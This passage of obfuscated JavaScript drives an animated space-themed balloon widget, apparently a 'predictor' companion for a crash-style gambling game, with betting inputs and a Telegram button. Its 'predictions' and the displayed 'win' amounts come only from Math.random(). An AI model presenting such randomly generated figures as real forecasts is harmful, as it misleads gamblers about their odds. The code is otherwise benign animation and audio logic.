    gameContainer.classList.remove("high-flying");
    balloon.style.transition = "transform 1s ease, scale 1s ease";
    balloon.style.setProperty("--lift-height", "-70%");
    balloon.style.transform = "translate(-50%, -70%)";
    balloon.style.scale = '1';
    valueDisplay.textContent = "1.00x";
    saturn.style.filter = "drop-shadow(0 0 15px rgba(255, 255, 255, 0.3))";
    document.querySelectorAll(".space-elements, .nebula, .saturn").forEach(_0x1d55ab => {
      _0x1d55ab.style.transform = '';
    });
    stars.style.animation = "none";
    void stars.offsetWidth;
    stars.style.animation = "stars-drift 120s infinite linear";
    document.querySelectorAll(".star").forEach(_0x5d4885 => {
      const _0x3d3945 = _0x5d4885.className;
      _0x5d4885.style.animation = "none";
      _0x5d4885.style.transform = '';
      void _0x5d4885.offsetWidth;
      if (_0x3d3945.includes("star-small")) {
        _0x5d4885.style.animation = "twinkle-small 3s infinite alternate";
      } else {
        if (_0x3d3945.includes("star-medium")) {
          _0x5d4885.style.animation = "twinkle-medium 4s infinite alternate";
        } else {
          if (_0x3d3945.includes("star-large")) {
            _0x5d4885.style.animation = "twinkle-large 5s infinite alternate";
          } else {
            if (_0x3d3945.includes("star-bright")) {
              _0x5d4885.style.animation = "pulse-bright 2s infinite alternate";
            } else if (_0x3d3945.includes("star-colored")) {
              _0x5d4885.style.animation = "color-shift 8s infinite alternate";
            }
          }
        }
      }
    });
    setTimeout(() => {
      balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
      _0x33919d();
    }, 800);
  });
}
function updateBackgroundShift(_0x51805a) {
  const _0x271f4b = (_0x51805a - 1) / 9;
  const _0x2b6d84 = 10 + 20 * _0x271f4b;
  gameContainer.style.setProperty("--background-shift", _0x2b6d84 + 'vh');
  gameContainer.style.setProperty("--background-shift-high", _0x2b6d84 * 1.2 + 'vh');
}
function animate(_0x3f2642, _0x19d188, _0xec4e46) {
  const _0x2ff662 = performance.now();
  isAnimating = true;
  predictButton.disabled = true;
  balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
  balloon.classList.add("flying");
  gameContainer.classList.add("flying");
  function _0x10a51e(_0x2d9656) {
    const _0x42f939 = _0x2d9656 - _0x2ff662;
    const _0x57aa32 = Math.min(_0x42f939 / _0xec4e46, 1);
    const _0x1bd60 = 1 - Math.pow(1 - _0x57aa32, 4);
    const _0x3d0921 = _0x3f2642 + (_0x19d188 - _0x3f2642) * _0x1bd60;
    updateBackgroundShift(_0x3d0921);
    updateBalloon(_0x3d0921.toFixed(2));
    if (_0x57aa32 < 1) {
      requestAnimationFrame(_0x10a51e);
    } else {
      isAnimating = false;
      setTimeout(() => {
        predictButton.disabled = false;
      }, 500);
    }
  }
  requestAnimationFrame(_0x10a51e);
}
function easeOutQuart(_0x51afe8) {
  return 1 - Math.pow(1 - _0x51afe8, 4);
}
predictButton.addEventListener("click", async () => {
  if (isAnimating) {
    return;
  }
  isAnimating = true;
  predictButton.disabled = true;
  backButton.classList.add("disabled");
  telegramButton.classList.add("disabled");
  await resetBalloon();
  targetMultiplier = getRandomMultiplier();
  const _0x554bcb = parseFloat(targetMultiplier) > 5 ? 5000 : 4000;
  animate(1, parseFloat(targetMultiplier), _0x554bcb);
  const _0x114f7b = document.querySelector(".meteor");
  if (_0x114f7b) {
    _0x114f7b.style.animation = "none";
    void _0x114f7b.offsetWidth;
    _0x114f7b.style.animation = "meteor-fall 8s 1";
  }
  setTimeout(() => {
    backButton.classList.remove("disabled");
    telegramButton.classList.remove("disabled");
    predictButton.disabled = false;
  }, _0x554bcb + 500);
});
updateBalloon(1);
function _0x304b22(_0x2bf044, _0x5b9ac6, _0x53f546, _0x2e0f6d, _0x1cc086) {
  return _0x5d43(_0x2e0f6d - 0x334, _0x5b9ac6);
}
balloon.style.setProperty("--lift-height", "-70%");
balloon.style.transform = "translate(-50%, -70%)";
balloon.style.scale = '1';
balloon.style.transition = "transform 3s cubic-bezier(0.19, 1, 0.22, 1), scale 3s cubic-bezier(0.19, 1, 0.22, 1)";
for (let i = 0; i < 3; i++) {
  createRandomMeteor();
}
startSaturnMovement();
const startButton = document.getElementById("startButton");
const bettingPanel = document.getElementById("bettingPanel");
const confirmButton = document.getElementById("confirmButton");
const betDisplay = document.getElementById("betDisplay");
const ball = document.getElementById("ball");
const betInput = document.getElementById("betAmount");
const currencyInputs = document.querySelectorAll("input[name='currency']");
function _0x54860a(_0x51af15, _0x28e625, _0x1b7a1e, _0x479599, _0x2c2739) {
  return _0x5d43(_0x479599 + 0x3bc, _0x2c2739);
}
const ballContainer = document.querySelector(".ball-container");
let betAmount = 0;
let selectedCurrency = '';
startButton.addEventListener("click", () => {
  bettingPanel.style.display = "flex";
  setTimeout(() => {
    bettingPanel.classList.add("visible");
  }, 10);
  startButton.style.display = "none";
});
function updateConfirmButtonState() {
  const _0x278de2 = Array.from(currencyInputs).some(_0x44f96b => _0x44f96b.checked);
  const _0x1242f9 = parseFloat(betInput.value) > 0;
  confirmButton.disabled = !(_0x278de2 && _0x1242f9);
}
betInput.addEventListener("input", updateConfirmButtonState);
currencyInputs.forEach(_0x435d7b => {
  _0x435d7b.addEventListener("change", updateConfirmButtonState);
});
confirmButton.addEventListener("click", () => {
  betAmount = parseFloat(betInput.value) || 0;
  selectedCurrency = document.querySelector("input[name='currency']:checked").value;
  betDisplay.innerHTML = '' + selectedCurrency + betAmount.toFixed(2);
  betDisplay.style.opacity = 1;
  bettingPanel.classList.remove("visible");
  bettingPanel.classList.add("hiding");
  restartButton.style.display = "block";
  setTimeout(() => {
    bettingPanel.style.display = "none";
    bettingPanel.classList.remove("hiding");
  }, 400);
  window.scrollTo(0, 0);
  ball.classList.add("inflating");
  animateBallAndBet();
});
function _0x2ddf13(_0x2155da, _0xba75dc, _0x33561e, _0x268db1, _0x3533bb) {
  return _0x5d43(_0x268db1 - 0x130, _0xba75dc);
}
function getRandomMultiplier() {
  const _0x559be6 = {
    min: 0x2,
    max: 0x3,
    weight: 0.4
  };
  const _0x4e820d = {
    min: 0x3,
    max: 3.5,
    weight: 0.3
  };
  const _0x491b73 = {
    min: 3.5,
    max: 0x4,
    weight: 0.2
  };
  const _0x353a3c = {
    min: 0x4,
    max: 0x5,
    weight: 0.1
  };
  const _0x2302d3 = [_0x559be6, _0x4e820d, _0x491b73, _0x353a3c];
  const _0x13752d = _0x2302d3.reduce((_0x42a4d3, _0x394dbd) => _0x42a4d3 + _0x394dbd.weight, 0);
  let _0x1a9875 = Math.random() * _0x13752d;
  for (const {
    min: _0x21d1bd,
    max: _0xe0416c,
    weight: _0x16925d
  } of _0x2302d3) {
    if (_0x1a9875 < _0x16925d) {
      return Math.random() * (_0xe0416c - _0x21d1bd) + _0x21d1bd;
    }
    _0x1a9875 -= _0x16925d;
  }
}
function animateBallAndBet() {
  let _0x270b50 = 1;
  let _0x2c75f4 = betAmount;
  const _0x338c1d = getRandomMultiplier();
  const _0x1b2d77 = 100 / _0x338c1d;
  let _0x3ed29e = false;
  let _0x98a83a = 0.01;
  const _0x2c2831 = new Audio("https://assets.mixkit.co/sfx/preview/mixkit-balloon-foil-squeak-2811.mp3");
  _0x2c2831.volume = 0.3;
  _0x2c2831.loop = true;
  _0x2c2831.play()["catch"](_0x2ce76f => {
    console.log("Автовоспроизведение звука заблокировано браузером:", _0x2ce76f);
  });
  const _0xa7b084 = setInterval(() => {
    if (_0x270b50 >= 1.8 && !_0x3ed29e) {
      _0x3ed29e = true;
      _0x2c2831.pause();
      ball.classList.remove("inflating");
      explodeBalloon(_0x338c1d);
      clearInterval(_0xa7b084);
    } else {
      if (!_0x3ed29e) {
        _0x98a83a = _0x98a83a * 1.03;
        _0x270b50 += 0.02 + _0x98a83a;
        _0x2c75f4 = betAmount * (_0x270b50 / 1.8) * _0x338c1d;
        const _0x18a767 = 200 * _0x270b50;
        ballContainer.style.width = _0x18a767 + 'px';
        ballContainer.style.height = _0x18a767 + 'px';
        ball.style.transform = "scale(" + _0x270b50 + ')';
        ball.style.transition = "transform 0.1s ease-in-out";
        if (_0x270b50 > 1.4400000000000002) {
          const _0x2ea463 = _0x270b50 / 1.8 * 2 - 1.6;
          if (_0x2ea463 > 0) {
            const _0x488747 = (Math.random() - 0.5) * _0x2ea463;
            const _0x32dd71 = (Math.random() - 0.5) * _0x2ea463;
            ball.style.transform = "scale(" + _0x270b50 + ") translate(" + _0x488747 + "px, " + _0x32dd71 + "px)";
          }
        }
        betDisplay.style.transform = "translate(-50%, -50%) scale(" + Math.min(_0x270b50, 1.6) + ')';
        betDisplay.style.fontSize = 13 + 5 * Math.min(_0x270b50, 1.6) + 'px';
        betDisplay.innerHTML = '' + selectedCurrency + _0x2c75f4.toFixed(2);
      }
    }
  }, _0x1b2d77);
}
function explodeBalloon(_0x4f8065) {
  const _0x2ac6b3 = document.createElement("div");
  _0x2ac6b3.className = "explosion-container";
  ballContainer.appendChild(_0x2ac6b3);
  playExplosionSound();
  for (let _0x38a042 = 0; _0x38a042 < 40; _0x38a042++) {
    const _0x4434cb = document.createElement("div");
    _0x4434cb.className = "explosion-particle";
    const _0x30dd5c = Math.random() * Math.PI * 2;
    const _0xb03820 = 50 + Math.random() * 150;
    const _0x570c80 = 0.5 + Math.random() * 1;
    const _0x158963 = 5 + Math.random() * 20;
    _0x4434cb.style.backgroundColor = getRandomColor();
    _0x4434cb.style.left = "50%";
    _0x4434cb.style.top = "50%";
    _0x4434cb.style.width = _0x158963 + 'px';
    _0x4434cb.style.height = _0x158963 + 'px';
    _0x4434cb.style.animation = "explode " + _0x570c80 + "s ease-out forwards";
    _0x4434cb.style.transform = "translate(-50%, -50%) rotate(" + Math.random() * 360 + "deg)";
    _0x4434cb.style.setProperty("--end-x", Math.cos(_0x30dd5c) * _0xb03820 + 'px');
    _0x4434cb.style.setProperty("--end-y", Math.sin(_0x30dd5c) * _0xb03820 + 'px');
    _0x2ac6b3.appendChild(_0x4434cb);
  }
  const _0xd4a964 = document.createElement("div");
  _0xd4a964.className = "shockwave";
  _0x2ac6b3.appendChild(_0xd4a964);
  ball.style.opacity = '0';
  ball.style.transition = "opacity 0.2s ease-out";
  const _0x3d4047 = betAmount * _0x4f8065;
  setTimeout(() => {
    betDisplay.innerHTML = '' + selectedCurrency + _0x3d4047.toFixed(2);
    betDisplay.style.fontSize = "36px";
    betDisplay.style.color = "#FFD700";
    betDisplay.style.textShadow = "0 0 10px rgba(255, 215, 0, 0.7)";
    betDisplay.classList.add("win-amount");
  }, 200);
}
function playExplosionSound() {
  const _0x116e27 = {
    waxjS: function (_0x154811, _0x2ce7f1) {
      return _0x154811 !== _0x2ce7f1;
    }
  };
  _0x116e27.LgAte = "QJtui";
  _0x116e27.PfsZP = "Khvfp";
  _0x116e27.dcpJy = "Автовоспроизведение звука заблокировано браузером:";
  _0x116e27.DweCi = "https://assets.mixkit.co/sfx/preview/mixkit-explosion-impact-1682.mp3";
  const _0x1a2793 = new Audio();
  _0x1a2793.src = _0x116e27.DweCi;
  _0x1a2793.volume = 0.5;
  _0x1a2793.play()["catch"](_0xe08b5b => {
    if (_0x116e27.LgAte !== _0x116e27.PfsZP) {
      console.log(_0x116e27.dcpJy, _0xe08b5b);
    } else {
      if (_0x286438) {
        const _0x59dadb = _0x1a42b6.apply(_0x37c852, arguments);
        _0x1fa3bb = null;
        return _0x59dadb;
      }
    }
  });
}
function getRandomColor() {
  const _0x6e0b3b = ["#FF5252", "#FF4081", "#E040FB", "#7C4DFF", "#536DFE", "#448AFF", "#40C4FF", "#18FFFF", "#64FFDA", "#69F0AE", "#B2FF59", "#EEFF41", "#FFFF00", "#FFD740", "#FFAB40", "#FF6E40"];
  return _0x6e0b3b[Math.floor(Math.random() * _0x6e0b3b.length)];
}
restartButton.addEventListener("click", () => {
  bettingPanel.style.display = "none";
  startButton.style.display = "block";
  restartButton.style.display = "none";
  betDisplay.style.opacity = 0;
  betDisplay.style.color = "#fff";
  betDisplay.style.textShadow = "0 2px 4px rgba(0, 0, 0, 0.4)";
  betDisplay.style.fontSize = "22px";
  betDisplay.classList.remove("win-amount");
  ball.style.transform = "scale(1)";
  ball.style.transition = "none";
  ball.style.opacity = '1';
  ball.classList.remove("inflating");
  const _0x3ae8ae = document.querySelector(".explosion-container");
  if (_0x3ae8ae) {
    _0x3ae8ae.remove();
  }
  ballContainer.style.width = "500px";
  ballContainer.style.height = "200px";
});
function createStars() {
  const _0x58a55e = document.getElementById("stars");
  for (let _0x4c061d = 0; _0x4c061d < 50; _0x4c061d++) {
    const _0x2af4f1 = document.createElement("div");
    _0x2af4f1.className = "star";
    const _0xd5c378 = Math.random() * 100;
    const _0x109811 = Math.random() * 60;
    _0x2af4f1.style.left = _0xd5c378 + '%';
    _0x2af4f1.style.top = _0x109811 + '%';
    const _0x30293d = 1 + Math.random() * 2;
    _0x2af4f1.style.width = _0x30293d + 'px';
    _0x2af4f1.style.height = _0x30293d + 'px';
    const _0x23cc68 = Math.random() * 5;
    _0x2af4f1.style.animationDelay = _0x23cc68 + 's';
    const _0x540211 = 3 + Math.random() * 4;
    _0x2af4f1.style.animationDuration = _0x540211 + 's';
    _0x58a55e.appendChild(_0x2af4f1);
  }
}
function _0x83e931(_0x4f2251, _0x3b232a, _0x4f6dca, _0x3735e4, _0x566eb9) {
  return _0x5d43(_0x566eb9 + 0x3ac, _0x4f6dca);
}
window.addEventListener("load", createStars);